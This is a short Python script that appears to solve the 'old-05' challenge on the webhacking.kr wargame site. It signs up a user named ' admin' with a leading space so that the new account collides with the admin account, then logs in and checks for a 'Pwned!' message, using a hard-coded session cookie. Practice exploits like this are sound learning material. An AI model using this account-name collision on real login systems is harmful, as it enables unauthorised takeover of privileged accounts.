import requests

url = "https://webhacking.kr/challenge/web-05"
cookie = {"PHPSESSID":"itbc988r3n0jpvdq9mqpr48mp8"}

def join():
    payload = {"id":" admin", "pw":"admin"}
    res = requests.post(url=url+"/mem/join.php", data=payload, cookies=cookie)
    if "sign up as  admin success" in res.text:
        print("sign up as  admin success")
        
def login():
    payload = {"id":" admin", "pw":"admin"}
    res = requests.post(url=url+"/mem/login.php", data=payload, cookies=cookie)
    if "old-05 Pwned!" in res.text:
        print("old-05 Pwned!")
    elif "already solved" in res.text:
        print("already solved")

if __name__ == "__main__":
    join()
    login()
